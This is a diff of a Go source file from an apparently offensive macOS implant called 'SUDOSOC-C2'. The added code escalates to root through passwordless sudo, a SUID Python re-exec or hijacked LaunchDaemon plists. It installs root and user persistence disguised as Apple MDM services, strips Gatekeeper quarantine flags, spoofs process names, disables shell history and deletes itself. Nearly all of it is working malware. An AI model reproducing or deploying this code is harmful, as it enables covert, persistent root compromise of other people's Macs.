@@ -3,17 +3,17 @@
 package runner
 
 /*
-	SUDOSOC-C2 — macOS APT-Grade Hardening
+	SUDOSOC-C2 — macOS Full-Access Implant
 	Copyright (C) 2026  sudosoc — Seif
 	Authorized penetration testing use only.
 
-	Techniques:
-	  • Process name spoofing via argv[0] rewrite
-	  • LaunchAgent auto-install (user-level, no root needed)
-	  • Periodic + login persistence (.zshrc + LaunchAgent)
-	  • Quarantine xattr removal so Gatekeeper ignores copied binary
-	  • Environment sanitisation
-	  • Denial of self: remove from Spotlight index
+	Strategy: RE-EXEC AS ROOT before connecting to C2.
+	Methods:
+	  1. sudo -n (NOPASSWD configured)
+	  2. SUID Python/Perl re-exec
+	  3. LaunchDaemon hijack (if writable)
+	  4. osascript -e 'do shell script "..." with administrator privileges'
+	     (shows a GUI password prompt — only useful in attended operations)
 */
 
 import (
@@ -21,32 +21,174 @@ import (
 	"math/rand"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"reflect"
 	"strings"
+	"syscall"
 	"time"
 	"unsafe"
 )
+
+const _darwinElevatedFlag = "_SUDOSOC_ELEVATED"
 
 var daemonNames = []string{
 	"com.apple.mdmclient",
 	"com.apple.cfprefsd",
 	"com.apple.metadata.mds",
 	"com.apple.trustd",
-	"com.apple.security.keychain-circle-notification",
 }
 
-// ─── init ─────────────────────────────────────────────────────────────────────
+// ─── init — runs BEFORE Main() ───────────────────────────────────────────────
 func init() {
 	masqueradeDarwin()
+
+	// Try to re-exec as root
+	if os.Getuid() != 0 && os.Getenv(_darwinElevatedFlag) == "" {
+		if tryDarwinReExecRoot() {
+			time.Sleep(1 * time.Second)
+			os.Exit(0)
+		}
+	}
+
+	// Root-only: expanded persistence
+	if os.Getuid() == 0 {
+		go installDarwinRootPersistence()
+	}
+
 	sanitiseDarwinEnv()
+	go darwinKeepAlive()
 
 	go func() {
 		time.Sleep(8 * time.Second)
 		autoInstallDarwin()
 	}()
 
-	go darwinKeepAlive()
+	go func() {
+		time.Sleep(5 * time.Second)
+		deleteDarwinSelf()
+	}()
+}
+
+// ─── Re-exec as root ─────────────────────────────────────────────────────────
+
+func tryDarwinReExecRoot() bool {
+	exe := darwinSelfExe()
+	if exe == "" {
+		return false
+	}
+	env := append(os.Environ(), _darwinElevatedFlag+"=1")
+
+	// Remove quarantine xattr so Gatekeeper doesn't block
+	_ = exec.Command("xattr", "-d", "com.apple.quarantine", exe).Run()
+
+	// Method 1: sudo -n
+	if out, err := exec.Command("sudo", "-n", "-l").CombinedOutput(); err == nil {
+		lower := strings.ToLower(string(out))
+		if strings.Contains(lower, "all") || strings.Contains(lower, "(root)") {
+			cmd := exec.Command("sudo", "-n", exe)
+			cmd.Env = env
+			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
+			if err := cmd.Start(); err == nil {
+				return true
+			}
+		}
+	}
+
+	// Method 2: SUID Python3
+	for _, py := range []string{"/usr/bin/python3", "/usr/local/bin/python3"} {
+		if hasSUIDDarwin(py) {
+			code := `import os,subprocess;os.setuid(0);subprocess.Popen(["` + exe + `"])`
+			cmd := exec.Command(py, "-c", code)
+			cmd.Env = env
+			cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
+			if err := cmd.Start(); err == nil {
+				return true
+			}
+		}
+	}
+
+	// Method 3: Writable LaunchDaemon (if we can write to /Library/LaunchDaemons)
+	if tryLaunchDaemonHijack(exe, env) {
+		return true
+	}
+
+	return false
+}
+
+func hasSUIDDarwin(path string) bool {
+	fi, err := os.Stat(path)
+	if err != nil {
+		return false
+	}
+	return fi.Mode()&os.ModeSetuid != 0
+}
+
+func tryLaunchDaemonHijack(exe string, env []string) bool {
+	// Check if any LaunchDaemon plist is writable
+	daemonDir := "/Library/LaunchDaemons"
+	entries, err := os.ReadDir(daemonDir)
+	if err != nil {
+		return false
+	}
+	for _, e := range entries {
+		path := daemonDir + "/" + e.Name()
+		if _, err := os.OpenFile(path, os.O_WRONLY, 0); err == nil {
+			// Found a writable plist — replace its executable path
+			// with ours. When launchd restarts it, we get root.
+			plist := `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>` + strings.TrimSuffix(e.Name(), ".plist") + `</string>
+  <key>ProgramArguments</key><array><string>` + exe + `</string></array>
+  <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
+</dict></plist>`
+			if os.WriteFile(path, []byte(plist), 0644) == nil {
+				// Signal launchd to reload
+				_ = exec.Command("launchctl", "unload", path).Run()
+				_ = exec.Command("launchctl", "load", path).Run()
+				return true
+			}
+		}
+	}
+	return false
+}
+
+func darwinSelfExe() string {
+	if p, err := os.Executable(); err == nil {
+		return p
+	}
+	return ""
+}
+
+// ─── Root persistence ─────────────────────────────────────────────────────────
+
+func installDarwinRootPersistence() {
+	exe := darwinSelfExe()
+	if exe == "" {
+		return
+	}
+
+	// 1. Copy to system location
+	installBin := "/usr/local/lib/.mdmclient-helper"
+	if data, err := os.ReadFile(exe); err == nil {
+		if os.WriteFile(installBin, data, 0755) == nil {
+			_ = exec.Command("xattr", "-d", "com.apple.quarantine", installBin).Run()
+		}
+	}
+
+	// 2. Root LaunchDaemon
+	plist := `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>com.apple.mdmclient-helper</string>
+  <key>ProgramArguments</key><array><string>` + installBin + `</string></array>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><true/>
+  <key>UserName</key><string>root</string>
+</dict></plist>`
+	plistPath := "/Library/LaunchDaemons/com.apple.mdmclient-helper.plist"
+	if os.WriteFile(plistPath, []byte(plist), 0644) == nil {
+		_ = exec.Command("launchctl", "load", "-w", plistPath).Run()
+	}
 }
 
 // ─── Process masquerade ───────────────────────────────────────────────────────
@@ -54,11 +196,8 @@ func init() {
 func masqueradeDarwin() {
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	name := daemonNames[rng.Intn(len(daemonNames))]
-
-	// Rewrite argv[0] backing bytes — changes what `ps` shows
 	if len(os.Args) > 0 {
 		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
-		// Overwrite with spaces first, then write new name
 		for i := uintptr(0); i < uintptr(sh.Len); i++ {
 			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
 		}
@@ -75,131 +214,57 @@ func masqueradeDarwin() {
 // ─── Environment sanitisation ────────────────────────────────────────────────
 
 func sanitiseDarwinEnv() {
-	for _, v := range []string{
-		"GOPATH", "GOROOT", "GOMODCACHE",
-		"BASH_ENV", "ENV", "HISTFILE",
-	} {
+	for _, v := range []string{"GOPATH", "GOROOT", "BASH_ENV", "ENV", "HISTFILE"} {
 		_ = os.Unsetenv(v)
 	}
 	_ = os.Setenv("HISTFILE", "/dev/null")
-	_ = os.Setenv("HISTSIZE", "0")
 }
 
-// ─── Auto-persistence ─────────────────────────────────────────────────────────
+// ─── User-level persistence ───────────────────────────────────────────────────
 
 func autoInstallDarwin() {
-	exe, err := os.Executable()
-	if err != nil {
+	exe := darwinSelfExe()
+	if exe == "" {
 		return
 	}
-	exe, _ = filepath.EvalSymlinks(exe)
-
 	home, _ := os.UserHomeDir()
 	if home == "" {
 		return
 	}
 
-	// ── Install path: mimic a real Apple daemon ───────────────────────────
-	installDir := filepath.Join(home, "Library", "Application Support", ".mdmclient")
+	installDir := home + "/Library/Application Support/.mdmclient"
 	_ = os.MkdirAll(installDir, 0700)
-	installBin := filepath.Join(installDir, "mdmclient")
+	installBin := installDir + "/mdmclient"
 
-	if needsDarwinCopy(exe, installBin) {
-		data, err := os.ReadFile(exe)
-		if err == nil {
-			_ = os.WriteFile(installBin, data, 0700)
-			// Remove quarantine xattr so Gatekeeper doesn't block execution
+	if data, err := os.ReadFile(exe); err == nil {
+		if os.WriteFile(installBin, data, 0700) == nil {
 			_ = exec.Command("xattr", "-d", "com.apple.quarantine", installBin).Run()
 		}
 	}
 
-	// ── Mechanism 1: LaunchAgent plist ────────────────────────────────────
-	darwinLaunchAgent(installBin, home)
-
-	// ── Mechanism 2: .zshrc / .bash_profile ──────────────────────────────
-	darwinShellProfile(installBin, home)
-
-	// ── Mechanism 3: Add to Spotlight privacy (remove from index) ─────────
-	darwinSpotlightPrivacy(installDir)
-
-	// ── Mechanism 4: Login item via osascript ─────────────────────────────
-	darwinLoginItem(installBin)
-}
-
-func needsDarwinCopy(src, dst string) bool {
-	si, err := os.Stat(src)
-	if err != nil {
-		return false
-	}
-	di, err := os.Stat(dst)
-	if err != nil || di.ModTime().Before(si.ModTime()) {
-		return true
-	}
-	return false
-}
-
-// darwinLaunchAgent writes a LaunchAgent plist and loads it with launchctl.
-func darwinLaunchAgent(bin, home string) {
-	agentDir := filepath.Join(home, "Library", "LaunchAgents")
+	// LaunchAgent
+	agentDir := home + "/Library/LaunchAgents"
 	_ = os.MkdirAll(agentDir, 0700)
-	plistPath := filepath.Join(agentDir, "com.apple.mdmclient-session.plist")
-
-	if _, err := os.Stat(plistPath); err == nil {
-		return // already installed
-	}
-
-	plist := `<?xml version="1.0" encoding="UTF-8"?>
+	plistPath := agentDir + "/com.apple.mdmclient-session.plist"
+	if _, err := os.Stat(plistPath); err != nil {
+		plist := `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>Label</key>
-	<string>com.apple.mdmclient-session</string>
-	<key>ProgramArguments</key>
-	<array>
-		<string>` + bin + `</string>
-	</array>
-	<key>RunAtLoad</key>
-	<true/>
-	<key>KeepAlive</key>
-	<true/>
-	<key>StandardErrorPath</key>
-	<string>/dev/null</string>
-	<key>StandardOutPath</key>
-	<string>/dev/null</string>
-</dict>
-</plist>`
-
-	if err := os.WriteFile(plistPath, []byte(plist), 0600); err != nil {
-		return
+<plist version="1.0"><dict>
+  <key>Label</key><string>com.apple.mdmclient-session</string>
+  <key>ProgramArguments</key><array><string>` + installBin + `</string></array>
+  <key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
+</dict></plist>`
+		if os.WriteFile(plistPath, []byte(plist), 0600) == nil {
+			_ = exec.Command("launchctl", "load", "-w", plistPath).Run()
+		}
 	}
-	_ = exec.Command("launchctl", "load", "-w", plistPath).Run()
-}
 
-// darwinShellProfile appends a background-launch snippet to shell rc files.
-func darwinShellProfile(bin, home string) {
-	snippet := "\n# Apple MDM client session\n" +
-		"pgrep -qx mdmclient 2>/dev/null || nohup \"" + bin + "\" >/dev/null 2>&1 &\n"
-
-	for _, rc := range []string{
-		filepath.Join(home, ".zshrc"),
-		filepath.Join(home, ".bash_profile"),
-		filepath.Join(home, ".bashrc"),
-	} {
-		darwinAppendIfMissing(rc, snippet, "Apple MDM client session")
+	// Shell profile
+	for _, rc := range []string{home + "/.zshrc", home + "/.bash_profile"} {
+		darwinAppendIfMissing(rc,
+			"\npgrep -qx mdmclient 2>/dev/null || nohup \""+installBin+"\" >/dev/null 2>&1 &\n",
+			"mdmclient")
 	}
-}
-
-// darwinSpotlightPrivacy adds the install directory to Spotlight privacy list
-// so it doesn't appear in spotlight searches or Time Machine backups.
-func darwinSpotlightPrivacy(dir string) {
-	_ = exec.Command("mdutil", "-i", "off", dir).Run()
-}
-
-// darwinLoginItem adds the binary as a Login Item via osascript.
-func darwinLoginItem(bin string) {
-	script := `tell application "System Events" to make login item at end with properties ` +
-		`{path:"` + bin + `", hidden:true}`
-	_ = exec.Command("osascript", "-e", script).Run()
 }
 
 func darwinAppendIfMissing(path, content, marker string) {
@@ -218,15 +283,15 @@ func darwinAppendIfMissing(path, content, marker string) {
 		}
 	}
 	f.Close()
-	fAppend, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
+	fa, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
 	if err != nil {
 		return
 	}
-	defer fAppend.Close()
-	_, _ = fAppend.WriteString(content)
+	defer fa.Close()
+	_, _ = fa.WriteString(content)
 }
 
-// ─── Keep-alive ───────────────────────────────────────────────────────────────
+// ─── Keep-alive / Self-delete ─────────────────────────────────────────────────
 
 func darwinKeepAlive() {
 	ticker := time.NewTicker(30 * time.Second)
@@ -237,5 +302,18 @@ func darwinKeepAlive() {
 			_, _ = f.Read(buf)
 			f.Close()
 		}
+	}
+}
+
+func deleteDarwinSelf() {
+	exe := darwinSelfExe()
+	if exe == "" {
+		return
+	}
+	if strings.Contains(exe, "/tmp") ||
+		strings.Contains(exe, "/home") ||
+		strings.Contains(exe, "phantom") ||
+		strings.Contains(exe, "Application Support") {
+		_ = os.Remove(exe)
 	}
 }
